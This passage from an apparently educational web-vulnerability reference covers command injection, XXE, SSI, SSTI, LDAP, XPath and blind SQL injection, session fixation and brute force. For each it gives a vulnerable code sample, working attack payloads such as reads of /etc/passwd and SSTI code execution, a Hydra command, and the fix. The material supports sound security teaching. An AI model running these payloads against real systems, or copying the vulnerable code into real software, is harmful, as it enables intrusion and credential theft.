- Validate `Origin` and `Referer` headers
- Use the `SameSite` cookie attribute (`SameSite=Lax` or `SameSite=Strict`)
- Require re-authentication or CAPTCHA for sensitive operations
- Avoid using GET for state-changing actions

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Pro** (includes CSRF PoC generator)
- **OWASP ZAP**
- Manual testing using crafted HTML forms or `curl`
- Check for missing CSRF tokens in sensitive POST requests

---

### 📚 References

- [OWASP CSRF Page](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

***
## WEBVULN-004: Remote Code Execution (RCE)

### 🗂️ Category
Injection / Critical

### ⚠️ Vulnerability Overview
Remote Code Execution (RCE) allows an attacker to execute arbitrary system-level code on the target server. This is one of the most dangerous vulnerabilities, often leading to full system compromise, lateral movement, and persistence.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A web application allows users to ping a host:

```php
<?php
$host = $_GET['host'];
echo shell_exec("ping -c 1 " . $host);
?>

```
---
**Malicious Input:**


`127.0.0.1; whoami`

**Result:**

The command runs ping, then executes whoami, returning the server's current user.

**Alternative PoC Payloads:**

Linux:

`127.0.0.1; ls /`

Windows:

`127.0.0.1 & dir`

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub – RCE Labs](https://github.com/vulhub/vulhub)

---

### 🔒 Mitigation

- Never pass user input directly to system calls or `eval()` functions
- Use allowlists to strictly validate and sanitize inputs
- Avoid dangerous functions: `eval()`, `exec()`, `shell_exec()`, `popen()`, etc.
- Run applications with least privileges (non-root where possible)
- Use Web Application Firewalls (WAFs) for added detection and protection

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Intruder**
- **Metasploit Framework**
- **Commix** (for command injection automation)
- Manual fuzzing with OS-specific payloads
- Monitor logs and output for signs of command execution

---

### 📚 References

- [OWASP RCE Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger RCE](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/) — post-exploitation techniques


***
## WEBVULN-005: Command Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
Command Injection occurs when user input is passed directly to a system shell or command interpreter without proper sanitization. This allows attackers to execute arbitrary commands on the host system, potentially leading to full server compromise.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A web app provides a functionality to check server reachability:

```php
<?php
$ip = $_GET['ip'];
echo shell_exec("ping -c 1 " . $ip);
?>

```

**Malicious Input:**

`127.0.0.1; uname -a`

**Result:**

- Executes ping, then `uname -a`, leaking system info.

**PoC Payloads:**

**Linux:**

```
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
```
**Windows:**

```
127.0.0.1 & whoami
127.0.0.1 | dir
```

***
### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub – Command Injection Labs](https://github.com/vulhub/vulhub/tree/master/command-injection)

---

### 🔒 Mitigation

- Avoid executing system commands with user input
- Use safe APIs that don’t involve shell invocation
- Implement strict input validation and allowlists
- Escape shell metacharacters if shell execution is unavoidable
- Apply least privilege principles on server processes

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Repeater/Intruder**
- **Commix** (automated command injection)
- **Metasploit Framework**
- Manual testing with OS-specific payloads
- Monitor system command logs and anomalies

---

### 📚 References

- [OWASP Command Injection Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/) — for command abuse post-exploitation


***

## WEBVULN-006: Insecure Direct Object Reference (IDOR)

### 🗂️ Category
Broken Access Control

### ⚠️ Vulnerability Overview
IDOR occurs when an application exposes internal object references (like IDs, filenames, or usernames) without proper access control checks. Attackers can manipulate these references to access unauthorized data or functions.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A user profile is accessed via:

---
`GET /profile?user_id=1001`

- Changing the `user_id` to another value (e.g., `1002`) reveals another user's profile:

`GET /profile?user_id=1002`


**Result:**  
Sensitive information is disclosed due to missing authorization checks.

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

### 🔒 Mitigation

- Enforce access control checks server-side for every resource
- Do not expose predictable object references (use UUIDs or indirect mapping)
- Avoid relying on client-side authorization
- Log and monitor unauthorized access attempts

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite** (manual ID tampering)
- **Postman** or custom scripts for API fuzzing
- Review server logs for abnormal ID access patterns
- Automated tools (e.g., **Autorize** Burp plugin)

---

### 📚 References

- [OWASP IDOR Guide](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)
- [OWASP Top 10: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---
## WEBVULN-007: XML Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
XML Injection occurs when user input is inserted into an XML document or query without proper sanitization. This can lead to data manipulation, authentication bypass, or even denial of service. It’s commonly seen in SOAP-based services or applications parsing XML.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A login system accepts XML-based input:

```xml
<user>
    <username>admin</username>
    <password>admin</password>
</user>

```
---

Result:
The attacker bypasses authentication if the XML is used in backend XPath or SQL queries without sanitization.

Other Payloads:

```xml

<user><name>John</name><role>admin</role></user>

```
- Insert additional nodes
- Modify structure of parsed XML
- Exploit backend processing logic

---

### 🧪 Test Environment

- [bWAPP](http://www.itsecgames.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- Custom SOAP/XML-based test APIs

---

### 🔒 Mitigation

- Always sanitize and encode user input before inserting into XML
- Use secure XML parsers with entity resolution disabled
- Apply schema validation (XSD) for expected structure
- Avoid string concatenation when building XML
- Enable logging and anomaly detection for malformed XML inputs

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite** (modify XML requests)
- **SOAPUI** for testing SOAP/XML APIs
- Manual injection with crafted XML payloads
- Look for unauthenticated access, malformed parsing, or logic bypass

---

### 📚 References

- [OWASP XML Injection Guide](https://owasp.org/www-community/attacks/XML_Injection)
- [PortSwigger XML Injection](https://portswigger.net/web-security/xml-injection)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---
## WEBVULN-008: LDAP Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
LDAP Injection occurs when untrusted user input is embedded into an LDAP query without proper sanitization. Attackers can manipulate LDAP filters to bypass authentication, escalate privileges, or extract sensitive directory data.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A login form uses LDAP to authenticate:

```java
String ldapFilter = "(uid=" + user + ")";
```
**Malicious Input:**

```
Username: *)(uid=*

```

**Result:**
- LDAP filter becomes:

```
(uid=*)(uid=*)

```
- This can match all users and allow login bypass or unauthorized access.

**Other Payloads:**

- Authentication Bypass:

```
admin*)(userPassword=*
Privilege Escalation:
```
```
*)(|(admin=*))(
```
---
### 🧪 Test Environment

- [bWAPP](http://www.itsecgames.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- Custom apps with OpenLDAP backend

---

### 🔒 Mitigation

- Sanitize and validate all user input before including it in LDAP queries
- Use parameterized LDAP queries (e.g., with JNDI, .NET DirectoryServices)
- Apply allowlists for input fields (e.g., usernames, emails)
- Escape special characters in LDAP queries: `()|&!*=\<>~`

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite**
- Manual testing with crafted LDAP filter payloads
- Inspect backend logs for suspicious filter manipulation
- Use fuzzing to detect filter anomalies

---

### 📚 References

- [OWASP LDAP Injection Guide](https://owasp.org/www-community/attacks/LDAP_Injection)
- [PortSwigger LDAP Injection](https://portswigger.net/web-security/ldap-injection)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


***
## 🛡️ WEBVULN-009: XPath Injection

- **Category:** Injection  
- **Vulnerability ID:** WEBVULN-009  
- **Name:** XPath Injection  

---

### 🔍 Description
**XPath Injection** occurs when user-controlled input is unsafely embedded into XPath queries used to retrieve or manipulate data from XML documents. This allows attackers to alter the structure of the query, potentially bypassing authentication, accessing unauthorized data, or triggering denial of service.

---

### 🧪 Example / Proof of Concept

#### Vulnerable Code (PHP Example):
```php
$username = $_POST['username'];
$password = $_POST['password'];

$xml = simplexml_load_file('users.xml');
$result = $xml->xpath("//user[username/text()='$username' and password/text()='$password']");
```
---

**Attack Payload:**
```
Username: ' or '1'='1
Password: ' or '1'='1

```
**Resulting XPath:**
```
//user[username/text()='' or '1'='1' and password/text()='' or '1'='1']

```
- This always evaluates to true, allowing an attacker to bypass authentication.

### 🛡️ Mitigation

- **Input Validation & Escaping**: Always sanitize and escape user input to avoid breaking out of query structure.
- **Parameterized Queries**: Use libraries that support parameterized XPath expressions to prevent injection.
- **Avoid XML for Authentication**: Prefer secure, database-backed authentication systems where possible.
- **Least Privilege**: Ensure XML files and applications accessing them follow the principle of least privilege.

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Try injecting XPath payloads into fields used in XML queries.
- **Burp Suite**: Intercept and modify XML requests.
- **OWASP ZAP**: Scan for XML/XPath injection points.
- **FuzzDB**: Use known XPath injection payloads for fuzzing.

---

### 📚 References

- [OWASP: XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XPath Injection](https://portswigger.net/web-security/xpath-injection)

---
## WEBVULN-010: HTML Injection

- **Category:** Injection  
- **Vulnerability ID:** WEBVULN-010  
- **Name:** HTML Injection  

---

### 🔍 Description

**HTML Injection** is a type of injection attack where malicious HTML code is inserted into a web page. If the application improperly handles or sanitizes user input, an attacker can manipulate the content or structure of the page — potentially leading to content spoofing, redirection, or even client-side script execution in some cases.

While similar to Cross-Site Scripting (XSS), **HTML Injection** focuses on injecting HTML **without JavaScript execution**, often for defacement, phishing, or UI redressing.

---

### 🧪 Example / Proof of Concept

#### Vulnerable Code (PHP Example):
```php
$name = $_GET['name'];
echo "<p>Welcome, $name!</p>";
```
**Attack Payload:**

`<script>alert('Injected!')</script>

**Rendered Result:**

`<p>Welcome, <script>alert('Injected!')</script>!</p>`
- If output is not properly encoded, this executes a script (XSS), or at minimum injects unwanted HTML.

---

### 🛡️ Mitigation

- **Output Encoding**: Use proper output encoding (e.g., `htmlspecialchars()` in PHP) when displaying user input.
- **Input Validation**: Reject or sanitize input containing HTML tags unless explicitly intended.
- **Content Security Policy (CSP)**: Implement CSP headers to mitigate the risk of HTML/JS being misused in the browser.
- **Framework Defaults**: Use frameworks that automatically escape output (e.g., Django, Rails, React).

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Inject simple HTML tags like `<b>`, `<i>`, `<h1>`, or `<img src=x onerror=alert(1)>` to observe behavior.
- **Burp Suite**: Intercept and modify inputs; view response rendering.
- **OWASP ZAP**: Perform automated scanning to detect HTML injection vulnerabilities.
- **Browser DevTools**: Inspect rendered HTML and DOM for unexpected elements.

---

### 📚 References

- [OWASP: HTML Injection](https://owasp.org/www-community/attacks/HTML_Injection)
- [PortSwigger: HTML Injection](https://portswigger.net/web-security/html-injection)

***

## 🛡️ WEBVULN-011: Open Redirect

- **Category:** Validation & Redirects  
- **Vulnerability ID:** WEBVULN-011  
- **Name:** Open Redirect

---

### 🔍 Description

**Open Redirect** occurs when a web application allows untrusted input to control the URL to which a user is redirected after clicking a link or submitting a form. This can be exploited by attackers to redirect victims to malicious sites — often used in phishing or malware distribution.

---

### 🧪 Example / Proof of Concept

#### Vulnerable URL:

---

#### Exploit:
An attacker can send a user the following URL:
---

If the site blindly redirects to `url`, the user is taken to a malicious destination while thinking they're interacting with a trusted domain.

---

### 🛡️ Mitigation

- **Allowlist URLs**: Only allow redirects to trusted domains or specific internal paths.
- **Validate & Sanitize Input**: Block full URLs and only allow relative paths where possible.
- **Display Warning Pages**: Inform users when they are being redirected off-site.
- **Avoid External Redirects**: Where possible, avoid user-controlled redirection entirely.

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Modify `redirect`, `url`, or `next` parameters with external links.
- **Burp Suite**: Intercept requests and test for open redirect behavior.
- **OWASP ZAP**: Scan for open redirect issues using the automated scanner.
- **Payloads**:

---

---

### 📚 References

- [OWASP: Open Redirect](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards)
- [PortSwigger: Open Redirect](https://portswigger.net/web-security/open-redirect)

---

## WEBVULN-012: XML External Entity (XXE) Injection

### 🧠 Description
XXE occurs when an XML input containing a reference to an external entity is processed by a weakly configured XML parser. This can lead to:

- Disclosure of internal files
- Server-side request forgery (SSRF)
- Denial of Service (DoS)
- Remote code execution (in extreme cases)

### 🚨 Example Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
### 🛡️ Mitigation
- **Disable External Entities**: Configure your XML parsers to disallow `DOCTYPE` declarations and external entities.
- **Use Secure Parsers**: Prefer libraries with secure-by-default configurations (e.g., `defusedxml` in Python).
- **Input Validation**: Validate and sanitize XML input from untrusted sources.
- **Limit Permissions**: Restrict file system and network access from XML parsers whenever possible.

### 🧰 Testing Tools / Techniques
- **Manual Payload Injection**: Insert external entity definitions and monitor server behavior.
- **Burp Suite**: Use the XXE plugin or manually inject XXE payloads in intercepted requests.
- **OWASP ZAP**: Automated scanners can identify some XXE vulnerabilities.
- **XXEinjector**: A specialized tool for exploiting XXE vulnerabilities.

### 📚 References
- [OWASP: XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XXE Injection](https://portswigger.net/web-security/xxe)

---
***


## WEBVULN-013: Server-Side Includes (SSI) Injection

### 🧠 Description
SSI injection occurs when user input is embedded in files that are parsed by the web server for Server Side Includes (SSI). If the input is not properly sanitized, attackers can inject SSI directives that get executed by the server, leading to:

- Execution of arbitrary commands
- Disclosure of sensitive files
- Unauthorized access or data manipulation

This vulnerability typically affects older or misconfigured servers like Apache with `mod_include` enabled.

### 🚨 Example Payloads

Injecting SSI code into a vulnerable field:

```html
<!--#exec cmd="ls"-->
```
---
### ⚠️ Real-World Impact
- Gaining access to sensitive system files  
- Running arbitrary shell commands on the server  
- Leveraging for further attacks like privilege escalation  

---

### 🛡️ Mitigation
- **Disable SSI**: If not required, turn off SSI processing in your web server configuration.
- **Sanitize Input**: Properly validate and sanitize all user input to avoid injection into SSI-parsed files.
- **Use HTTP Headers**: Set `X-Content-Type-Options: nosniff` and related headers to reduce abuse.
- **Use Safer Templating**: Avoid legacy templating mechanisms that rely on SSI.

---

### 🧰 Testing Tools / Techniques
- **Manual Injection**: Inject known SSI payloads (`<!--#exec cmd="id"-->`) and observe the output.
- **Burp Suite**: Modify requests to test for reflected SSI behavior.
- **OWASP ZAP**: Scan for potential injection vectors.
- **Logs**: Check server logs for unexpected command execution patterns.

---

### 📚 References
- [OWASP: SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)  
- [PortSwigger: SSI Injection](https://portswigger.net/web-security/ssrf)  
- [Apache SSI Guide](https://httpd.apache.org/docs/current/howto/ssi.html)
---
***
## WEBVULN-014: HTTP Response Splitting

### 🧠 Description
HTTP Response Splitting is a vulnerability that arises when user-supplied data is included in HTTP headers without proper sanitization. By injecting CRLF (carriage return `\r` and line feed `\n`) characters, attackers can manipulate the structure of the HTTP response, potentially:

- Injecting malicious headers
- Triggering cross-site scripting (XSS)
- Redirecting users
- Performing cache poisoning

---

### 💥 Example Payloads

Injected input:
`%0d%0aSet-Cookie: session=attacker`

`When reflected in a vulnerable header (e.g., `Location`, `Set-Cookie`), this can split the response: `

`HTTP/1.1 302 Found Location: /somepath Set-Cookie: session=attacker `

---

### ⚠️ Real-World Impact
- Cookie manipulation
- HTTP header injection
- XSS through crafted responses
- Cache poisoning and phishing

---

### 🛡️ Mitigation
- **Input Validation**: Strip or encode CR (`\r`) and LF (`\n`) characters from user inputs used in HTTP headers.
- **Use Frameworks**: Leverage secure web frameworks that automatically sanitize headers.
- **Avoid Direct Header Manipulation**: Always validate and encode user input before using it in `Location`, `Set-Cookie`, etc.
- **Security Libraries**: Use libraries with strict header handling.

---

### 🧰 Testing Tools / Techniques
- **Manual Testing**: Try injecting `%0d%0a` into inputs reflected in headers.
- **Burp Suite**: Modify HTTP request headers to observe response manipulation.
- **OWASP ZAP**: Automated detection of header-based injections.
- **Fuzzing**: Use payloads with CRLF characters in fuzzing tools.

---

### 📚 References
- [OWASP: HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)  
- [PortSwigger: HTTP Response Splitting](https://portswigger.net/web-security/response-splitting)

***

### 🛡️ WEBVULN-015: OS Command Injection

🔹 Category
Injection

### 🆔 Vulnerability ID
**WEBVULN-015**

🧪 Demo / Proof of Concept (PoC)
✅ Example 1: Vulnerable Python Code (using os.system)
```python

import os
user_input = input("Enter filename: ")
os.system(f"ls {user_input}")

```
Exploit:


`Input: ; whoami`
Result: Executes `ls ; whoami`

✅ Example 2: Vulnerable PHP Code
```php

<?php
$cmd = $_GET['cmd'];
system("ping -c 1 " . $cmd);
?>

```
**Exploit:**


`URL: http://example.com/vuln.php?cmd=127.0.0.1;id`
`Result: Executes `ping -c 1 127.0.0.1;id``

**🛡️ Mitigation**

**✅ Safe Coding Practices**
- Avoid directly using user input in system-level commands.

- Use whitelisting, parameterized functions, or safe APIs.

- In Python, prefer subprocess.run() with list-based arguments and shell=False.

Example Fix (Python):
```
import subprocess
user_input = input("Enter filename: ")
subprocess.run(["ls", user_input], shell=False)
```
Example Fix (PHP):
```php

<?php
$allowed = ['127.0.0.1', 'localhost'];
$target = $_GET['cmd'];
if (in_array($target, $allowed)) {
    system("ping -c 1 " . escapeshellarg($target));
}
?>
```
🔧 Testing Tools / Techniques
- Burp Suite (Intruder, Repeater)

- OWASP ZAP

- Commix – Automated command injection tool

Manual Fuzzing: Use payloads like ; whoami, && ls, | id, etc.

**📚 References**
- OWASP: Command Injection

- PortSwigger: OS command injection

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)


***

### 🛡️ WEBVULN-016: Blind SQL Injection

**🔹 Category**
Injection

**🆔 Vulnerability ID**

**WEBVULN-016**

---
🧪 Demo / Proof of Concept (PoC)
✅ Example: Vulnerable PHP Code (Login Form)
```php

<?php
$user = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$user'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result)) {
    echo "User exists";
} else {
    echo "User not found";
}
?>
```
**🎯 Exploit Example (Boolean-based):**
```vbnet

Input: ' OR 1=1 -- 
Response: "User exists"
```

**🎯 Exploit Example (Blind Boolean-based):**
```vbnet

Input: ' AND 1=1 -- 
Result: Normal response
Input: ' AND 1=2 -- 

```
Result: Different response (indicating conditional logic success)

**🎯 Exploit Example (Time-based):**
```sql

Input: ' OR IF(1=1, SLEEP(5), 0) -- 

```
Response delay indicates SQL injection success.

**🛡️ Mitigation**

✅ Use Parameterized Queries / Prepared Statements
PHP (mysqli with prepared statements):
```php

$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
$stmt->execute();
```
**✅ Input Validation & Escaping**
Use whitelisting for input validation.

Escape output using context-aware functions.

**✅ Least Privilege**
Ensure the database user has limited permissions.

**🔧 Testing Tools / Techniques**
Burp Suite (Repeater/Intruder with boolean and time-based payloads)

- SQLMap (automates detection and exploitation)

- Manual Injection using:

- Boolean-based payloads: ' AND 1=1 --, ' AND 1=2 --

- Time-based payloads: ' OR SLEEP(5) --

**📚 References**
- OWASP: Blind SQL Injection

- PortSwigger: Blind SQL Injection

- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

***

### 🛡️ WEBVULN-017: Server-Side Template Injection (SSTI)
🔹 Category
Injection

**🆔 Vulnerability ID**
### WEBVULN-017

**🧪 Demo / Proof of Concept (PoC)**

---

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get("name", "")
    template = f"Hello {name}!"
    return render_template_string(template)

```
---
**🎯 Exploit (Jinja2 - Flask)**
`Input: {{7*7}}`
`Result: "Hello 49!"`

---
**🎯 Malicious Payload (Remote Code Execution PoC)**
`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`

---
**🛡️ Mitigation**

**✅ Avoid render_template_string**
- Use render_template() with static templates, never dynamic template strings.

**✅ Sanitize User Input**
- Do not trust user input within templates.

- Escaping input is not enough — separate logic and presentation.

**✅ Template Sandboxing**
- Use template sandboxing if supported (e.g., Jinja2 sandbox).

- Limit access to sensitive classes or globals.

---
**🔧 Testing Tools / Techniques**

- Manual Testing using common payloads:

- `{{7*7}}`

-`{{"".__class__.__mro__[1].__subclasses__()}}`

- Burp Suite – Manual payload testing and automation

- Template-Scanner – Automated SSTI scanner

    
🔎 Common Payloads

| Payload                                                                 | Purpose              |
|-------------------------------------------------------------------------|----------------------|
| `{{7*7}}`                                                               | Arithmetic test      |
| `{{ ''.__class__ }}`                                                    | Class object access  |
| `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }}` | RCE attempt|

**📚 References**
- PortSwigger: SSTI

- OWASP: SSTI

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

***
## PART II 
### Broken Authentication and Session Management

###🛡️ WEBVULN-018: Broken Authentication and Session Management (Session Fixation)
🔹 Category
- Authentication & Session Management

**🆔 Vulnerability ID**
**WEBVULN-018**

**🧪 Demo / Proof of Concept (PoC)**

---
**✅ What is Session Fixation?**

Session Fixation is a vulnerability where an attacker sets or predicts a user's session ID before they authenticate. If the session is not regenerated upon login, the attacker can hijack it once the victim logs in.

**✅ Example: Vulnerable PHP Logic**
```php

<?php
session_id($_GET['sessid']);
session_start();
// ... user logs in ...
?>
```
**🎯 Attack Flow:**
Attacker sends victim a link:
`https://example.com/login.php?sessid=abc123`

- Victim logs in with session ID abc123

- Attacker reuses the same session ID to impersonate the victim

**🛡️ Mitigation**
**✅ Regenerate Session ID After Login**
```php

<?php
session_start();
// after successful authentication
session_regenerate_id(true);
```
---

### ✅ Set Secure Session Attributes

- Use `HttpOnly`, `Secure`, and `SameSite` cookie flags
- Set short session expiration times
- Avoid exposing `session_id` via URLs

---

### 🔧 Testing Tools / Techniques

- **Burp Suite**:
  - Intercept and replay requests with fixed session IDs
  - Check for `Set-Cookie` header before and after login
- **OWASP ZAP**
- Manual analysis of session behavior

---

### 🔍 Indicators of Vulnerability

| Behavior                                      | Risk                        |
|-----------------------------------------------|-----------------------------|
| Session ID remains the same before/after login | High risk of session fixation |
| Session ID exposed in URL                     | High risk of hijacking      |
| No use of `session_regenerate_id()`           | Poor session handling       |

---

### 📚 References

- [OWASP: Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger: Session Fixation](https://portswigger.net/web-security/authentication/session-fixation)


---
**🧪 Hands-On: Session Fixation Demo**

**🧰 Requirements**
- Python 3

- Flask

- Browser

- Burp Suite (optional, for analysis)

---
**🚧 Vulnerable Flask App (for demo/testing)**

```python
# session_fixation_vuln.py
from flask import Flask, session, request, redirect, url_for, make_response

app = Flask(__name__)
app.secret_key = "super_secret_key"

@app.route('/')
def index():
    user = session.get('user')
    return f"👤 Logged in as: {user}" if user else "🔓 Not logged in"

@app.route('/set_session')
def set_session():
    session_id = request.args.get("sessid")
    resp = make_response(redirect(url_for('login')))
    if session_id:
        resp.set_cookie('session', session_id)
    return resp

@app.route('/login')
def login():
    session['user'] = "admin"
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)

```
**🧪 Exploit Steps**

- Attacker sends victim a crafted link:

```bash

http://localhost:5000/set_session?sessid=attacksessionid

```
- Victim clicks link and logs in at /login

- Session ID is reused from attacker: attacksessionid

- Attacker accesses / with the same session ID

```nginx

curl -b "session=attacksessionid" http://localhost:5000/

```

**🎯 Gets access to the authenticated session!**

**🛡️ Fix (in Flask)**
-Replace this line inside /login route:

```python

session['user'] = "admin"

```
- With a secure version that regenerates the session:

```python

from flask import session
session.clear()
session['user'] = "admin"
Optionally rotate the session cookie with:
```

```python

@app.before_request
def make_session_permanent():
    session.permanent = True
```
---

**🧪 Analyze with Burp Suite**
- Intercept login requests.

- Compare session cookies before and after login.

- If session ID doesn’t change → 🔥 Vulnerable to fixation!

***
**🛡️ WEBVULN-019: Brute Force Attack**
🔹 Category

Authentication

**🆔 Vulnerability ID**
**WEBVULN-019**

**🧪 Demo / Proof of Concept (PoC)**

**✅ What is a Brute Force Attack?**

- A Brute Force Attack is an automated method to guess credentials (usernames, passwords, PINs, tokens) by trying many combinations until access is granted.

**✅ Vulnerable PHP Login Example**
```php

<?php
$user = $_POST['username'];
$pass = $_POST['password'];

if ($user == "admin" && $pass == "123456") {
    echo "Login successful";
} else {
    echo "Invalid credentials";
}
```
**🎯 Attack Using Hydra (Example)**
```bash

`hydra -l admin -P /usr/share/wordlists/rockyou.txt http://target.com/login.php -V`
```
-l: login/username

-P: password list

-V: verbose output

---

### 🛡️ Mitigation

#### ✅ Account Lockout or Rate Limiting
- Temporarily block accounts after multiple failed logins (e.g., 5 tries)
- Use exponential back-off for delays

#### ✅ CAPTCHA or Bot Protection
- Use CAPTCHA to prevent automated logins
- Use WAFs or bot detection services

#### ✅ 2FA / MFA
- Enforce two-factor authentication to reduce the risk of credential stuffing

#### ✅ Logging & Monitoring
- Log failed login attempts
- Alert administrators on unusual behavior

---

### 🔧 Testing Tools / Techniques

- **Hydra**
- **Burp Suite Intruder**
- **OWASP ZAP**
- Manual login testing with predictable passwords

---

### 🔍 Indicators of Vulnerability

| Behavior                              | Risk                         |
|---------------------------------------|------------------------------|
| No delay or lockout after failures    | High risk of brute force     |
| Common usernames/passwords accepted   | Poor credential hygiene      |
| No CAPTCHA or rate limiting           | Susceptible to automation    |

---

### 📚 References

- [OWASP: Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)

***

# 🌐 WebVuln-020: Session Hijacking

**Category:**  
Session Management

**Vulnerability ID:**  
**WEBVULN-020**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A session ID is transmitted via an insecure channel or is predictable, allowing an attacker to steal or guess the session ID.

---

### 🧩 Payload:
- **Stealing Session ID via sniffing**  
   If an attacker has access to the network traffic (e.g., via a man-in-the-middle attack), they can capture the session cookie or token.

- **Session Fixation Attack**  
   An attacker may force a user to use a predetermined session ID by embedding it in a URL, request parameter, or via other means.

---

### ✅ Effect:
- **Session hijacking** allows attackers to impersonate a legitimate user and gain unauthorized access to sensitive data or functionality.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Use Secure HTTP-only Cookies**  
  Ensure cookies are marked with `HttpOnly` and `Secure` flags.
  
- ✅ **Use TLS/SSL**  
  Encrypt all communication channels to prevent sniffing of session tokens.

- ✅ **Implement Session Expiry and Regeneration**  
  Regularly regenerate session IDs after login and set an appropriate session timeout.

- ✅ **Enforce IP and User-Agent Binding**  
  Validate session IDs against IP addresses and user-agent strings.

---

## 🔧 Testing Tools / Techniques
- Burp Suite (for session token interception)
- Wireshark (for sniffing network traffic)
- OWASP ZAP (for vulnerability scanning)
- Manual testing with session hijacking techniques

---

## 📚 References
- OWASP: Session Hijacking  
- PortSwigger: Session Hijacking  
- OWASP Cheat Sheet: Secure Session Management

***
# 🌐 WebVuln-021: Password Cracking

**Category:**  
Authentication

**Vulnerability ID:**  
**WEBVULN-021**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
An attacker tries to guess or crack a user’s password by using techniques such as brute force, dictionary attacks, or rainbow tables.

---

### 🧩 Payload:
- **Brute Force Attack**: An attacker systematically checks all possible combinations of characters for a password.
- **Dictionary Attack**: The attacker uses a precompiled list of common passwords or dictionary words to attempt login.
- **Rainbow Table Attack**: The attacker uses precomputed hash values to quickly compare with password hashes in the database.

---

### ✅ Effect:
- **Account Compromise**: Successful password cracking allows an attacker to gain unauthorized access to a user’s account.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Enforce Strong Password Policies**  
  Require a mix of upper and lower case letters, numbers, and special characters.
  
- ✅ **Limit Login Attempts**  
  Implement account lockout or CAPTCHA after a predefined number of failed login attempts.

- ✅ **Use Salted Password Hashes**  
  Salt passwords before hashing to prevent the use of rainbow tables.

- ✅ **Enforce Multi-Factor Authentication (MFA)**  
  Require an additional form of authentication beyond just the password.

---

## 🔧 Testing Tools / Techniques
- Hydra (for brute force and dictionary attacks)
- Burp Suite Intruder (for automated password cracking)
